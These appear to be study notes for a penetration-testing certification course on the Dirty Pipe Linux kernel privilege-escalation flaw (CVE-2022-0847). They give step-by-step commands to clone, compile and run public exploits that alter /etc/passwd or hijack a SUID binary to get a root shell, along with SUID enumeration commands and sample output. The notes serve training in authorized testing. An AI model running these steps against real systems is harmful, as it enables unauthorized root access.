## 1. What is Dirty Pipe?

**Dirty Pipe** is a Linux kernel vulnerability:

- **CVE:** `CVE-2022-0847`
    
- Similar concept to **Dirty COW (CVE-2016-5195)**
    
- Affects kernels from **5.8 through 5.17** according to the provided module.
    

The vulnerability can allow an unprivileged user to **modify arbitrary files**, including files owned by root, when the attacker has **read access** to the target file.

```text
Normal permissions:

User
 │
 ├── Read file ──► Allowed
 └── Write file ─► Denied

Dirty Pipe
 │
 └── Kernel vulnerability
          │
          ▼
   Unauthorized modification
          │
          ▼
     Root-owned file
```

---

# 2. Why Is It Dangerous?

A particularly dangerous case is modifying:

```text
/etc/passwd
```

If the root account's password requirement is modified, an attacker may be able to use:

```bash
su
```

to obtain a root shell without the normal password prompt.

The important idea is:

> **You don't necessarily need write permission on the file itself.**

Dirty Pipe abuses the kernel's handling of **pipes** to achieve unauthorized writes.

---

# 3. What Is a Pipe?

A **pipe** is a mechanism for **unidirectional communication between processes**.

Conceptually:

```text
Process A
   │
   │ writes data
   ▼
 ┌──────┐
 │ Pipe │
 └──────┘
   │
   │ reads data
   ▼
Process B
```

Dirty Pipe abuses how the Linux kernel handles data associated with pipes and file pages.

---

# 4. Kernel Version Check

Before considering Dirty Pipe, determine the kernel version:

```bash
uname -r
```

Example from the module:

```text
5.13.0-46-generic
```

This falls within the vulnerable range described in the module.

You can also use:

```bash
uname -a
```

### Important

Do **not** conclude vulnerability from the version alone.

The proper methodology is:

```text
uname -r
    │
    ▼
Determine kernel version
    │
    ▼
Is it in vulnerable range?
    │
    ▼
Check patch/status
    │
    ▼
Exploit if applicable
```

---

# 5. Dirty Pipe Exploit

The module uses the following PoC repository:

```bash
git clone https://github.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits.git
```

Then:

```bash
cd CVE-2022-0847-DirtyPipe-Exploits
```

Compile:

```bash
bash compile.sh
```

This provides two exploit variants:

```text
exploit-1
exploit-2
```

---

# 6. Exploit 1 — Modify `/etc/passwd`

The first exploit modifies `/etc/passwd`.

### Execute

```bash
./exploit-1
```

The module demonstrates:

```text
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "piped"...
Password: Restoring /etc/passwd from /tmp/passwd.bak...
Done! Popping shell...
```

Then:

```bash
id
```

Result:

```text
uid=0(root) gid=0(root) groups=0(root)
```

### Attack chain

```text
Dirty Pipe
    │
    ▼
Unauthorized write
    │
    ▼
/etc/passwd
    │
    ▼
Modify root authentication
    │
    ▼
Root shell
```

The module's exploit also backs up and restores `/etc/passwd`, which is an important operational detail.

---

# 7. Exploit 2 — Hijack a SUID Binary

The second exploit takes a different approach.

Instead of modifying `/etc/passwd`, it uses Dirty Pipe to manipulate a **SUID binary**.

First find SUID binaries:

```bash
find / -perm -4000 2>/dev/null
```

Example output from the module:

```text
/usr/bin/su
/usr/bin/passwd
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/mount
/usr/bin/umount
/usr/bin/newgrp
...
```

The important part is:

```text
-perm -4000
```

which searches for files with the **SUID bit** set.

---

# 8. Exploit 2 Syntax

The exploit accepts the full path of a SUID binary:

```bash
./exploit-2 <SUID-binary>
```

Example from the module:

```bash
./exploit-2 /usr/bin/sudo
```

The module shows:

```text
[+] hijacking suid binary..
[+] dropping suid shell..
[+] restoring suid binary..
[+] popping root shell..
```

Then:

```bash
id
```

returns:

```text
uid=0(root) gid=0(root) groups=0(root),...
```

So the second attack chain is:

```text
Dirty Pipe
     │
     ▼
Find SUID binary
     │
     ▼
Hijack SUID binary
     │
     ▼
Drop SUID shell
     │
     ▼
Execute
     │
     ▼
uid=0(root)
```

---

# 9. Exploit 1 vs Exploit 2

||`exploit-1`|`exploit-2`|
|---|---|---|
|Target|`/etc/passwd`|SUID binary|
|Technique|Unauthorized file modification|SUID binary hijacking|
|Requirement|Vulnerable kernel + readable target|Vulnerable kernel + suitable SUID binary|
|Result|Root shell|Root shell|

Memory trick:

```text
exploit-1 → passwd → root

exploit-2 → SUID → root
```

---

# 10. CPTS Enumeration Workflow

When you suspect Dirty Pipe:

### Step 1 — Identify kernel

```bash
uname -r
```

### Step 2 — Check whether the kernel falls into the affected range

```text
5.8 ─────────────────── 5.17
       Dirty Pipe
```

### Step 3 — Look for useful targets

For the SUID approach:

```bash
find / -perm -4000 2>/dev/null
```

### Step 4 — Choose the appropriate exploit path

```text
                 Dirty Pipe?
                     │
                     ▼
                Kernel check
                     │
              ┌──────┴──────┐
              ▼             ▼
          passwd path    SUID path
              │             │
         exploit-1      find SUID
              │             │
              ▼             ▼
             root        exploit-2
                            │
                            ▼
                           root
```

---

# 11. Connection to Your Previous Kernel Exploit Module

This is another example of **kernel-level privilege escalation**.

Earlier:

```text
uname -a
   ↓
Identify kernel
   ↓
Find matching CVE
   ↓
PoC
   ↓
Root
```

Dirty Pipe follows the same overall methodology:

```text
uname -r
   ↓
Kernel 5.8–5.17?
   ↓
CVE-2022-0847
   ↓
Dirty Pipe PoC
   ↓
Modify privileged target
   ↓
Root
```

The major difference is the vulnerability mechanism.

### Dirty COW

```text
CVE-2016-5195
→ memory management / copy-on-write
```

### Dirty Pipe

```text
CVE-2022-0847
→ pipe/page-cache behavior
```

---

# 12. CPTS Key Takeaways

### Remember these:

**CVE:**

```text
CVE-2022-0847
```

**Name:**

```text
Dirty Pipe
```

**Affected range in the module:**

```text
Linux 5.8 → 5.17
```

**Kernel enumeration:**

```bash
uname -r
```

**SUID enumeration:**

```bash
find / -perm -4000 2>/dev/null
```

**Two exploit approaches:**

```text
exploit-1 → /etc/passwd → root
exploit-2 → SUID binary → root
```

### One-line memory trick

> **Dirty Pipe = kernel 5.8–5.17 → unauthorized file write → privileged target → root.**